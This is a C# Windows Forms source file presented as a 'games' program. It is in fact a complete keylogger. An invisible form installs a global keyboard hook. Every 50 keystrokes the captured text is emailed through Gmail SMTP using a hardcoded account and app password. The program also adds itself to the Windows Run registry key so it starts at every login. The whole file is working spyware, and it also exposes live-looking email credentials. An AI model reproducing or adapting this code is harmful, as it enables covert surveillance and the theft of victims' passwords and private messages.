using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using hoot;

namespace games
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.BackColor = Color.Lime;
            this.TransparencyKey = Color.Lime;
            System.Threading.Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo("tr-TR");
            System.Threading.Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo("tr-TR");
            TuslariDinle();
        }

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;



        globalKeyboardHook klavye = new globalKeyboardHook();
        int number = 0;
        string log = "Boş - ";
        bool BigChar = true;

        void TuslariDinle()
        {

            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.Z);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.U);
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);

            //Türkçe Karekterler 

            klavye.HookedKeys.Add(Keys.OemOpenBrackets);
            klavye.HookedKeys.Add(Keys.Oem6);
            klavye.HookedKeys.Add(Keys.Oem1);
            klavye.HookedKeys.Add(Keys.Oem7);
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem5);

            //Rakamlar

            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);

            //Üst Rakamlar

            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);

            //nokta , backspace vs
            klavye.HookedKeys.Add(Keys.OemPeriod);
            klavye.HookedKeys.Add(Keys.Back);


            klavye.HookedKeys.Add(Keys.Space);
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.CapsLock);


            klavye.KeyDown += new KeyEventHandler(TusKombinasyonu);
        }


        void Mail()
        {

            MailMessage msj = new MailMessage();
            SmtpClient istemci = new SmtpClient();

            istemci.Credentials = new System.Net.NetworkCredential("imemiss44@gmail.com", "yzqk tpex axnv mfga");
            istemci.Port = 587;
            istemci.Host = "smtp.gmail.com";
            istemci.EnableSsl = true;

            msj.Body = log.ToString();
            msj.Subject = "#Log";
            msj.From = new MailAddress("imemiss44@gmail.com");
            msj.To.Add("oozgememis@gmail.com");

            istemci.Send(msj);


        }

        void TusKombinasyonu(object sender, KeyEventArgs e)
        {
            bool shift = e.Shift;
            bool caps = Control.IsKeyLocked(Keys.CapsLock);
            char c = '\0';

            // Harfler
            if (e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
            {
                c = (char)e.KeyCode;
                if (shift ^ caps)
                    c = char.ToUpper(c, new System.Globalization.CultureInfo("tr-TR"));
                else
                    c = char.ToLower(c, new System.Globalization.CultureInfo("tr-TR"));
            }
            // Üst row rakamlar
            else if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
            {
                string normal = "0123456789";
                string shifted = ")!@#$%^&*(";
                c = shift ? shifted[e.KeyCode - Keys.D0] : normal[e.KeyCode - Keys.D0];
            }
            // Numpad rakamları
            else if (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9)
            {
                c = (char)('0' + (e.KeyCode - Keys.NumPad0));
            }
            else
            {
                switch (e.KeyCode)
                {
                    // Türkçe karakterler
                    case Keys.OemOpenBrackets: c = shift ^ caps ? 'Ğ' : 'ğ'; break;
                    case Keys.Oem6: c = shift ^ caps ? 'Ü' : 'ü'; break;
                    case Keys.Oem1: c = shift ^ caps ? 'Ş' : 'ş'; break;
                    case Keys.Oem7: c = shift ^ caps ? 'İ' : 'i'; break;
                    case Keys.OemQuestion: c = shift ^ caps ? 'Ö' : 'ö'; break;
                    case Keys.Oem5: c = shift ^ caps ? 'Ç' : 'ç'; break;

                    // Temel özel karakterler
                    case Keys.Space: c = ' '; break;
                    case Keys.Enter: c = '\n'; break;
                    case Keys.Back: log += "Back"; number++; break;
                    case Keys.OemPeriod: c = shift ? '>' : '.'; break;
                    case Keys.Oemcomma: c = shift ? '<' : ','; break;
                    case Keys.OemMinus: c = shift ? '_' : '-'; break;
                    case Keys.Oemplus: c = shift ? '+' : '='; break;
                    case Keys.Oemtilde: c = shift ? '~' : '`'; break;
                    case Keys.OemBackslash: c = shift ? '|' : '\\'; break;
                }
            }

            if (c != '\0')
            {
                log += c;
                number++;
            }

            // 50 tuş log sınırı kontrolü
            if (number > 50)
            {
                Mail();
                number = 0;
                log = "Boş - ";
            }

            // CapsLock durumu güncelleme
            if (e.KeyCode == Keys.CapsLock)
                BigChar = !BigChar;
        }



        private void Form1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                BigChar = true;
            }
            else
            {
                BigChar = false;
            }



            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("games", "\"" + Application.ExecutablePath + "\"");
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {

        }
    }
}
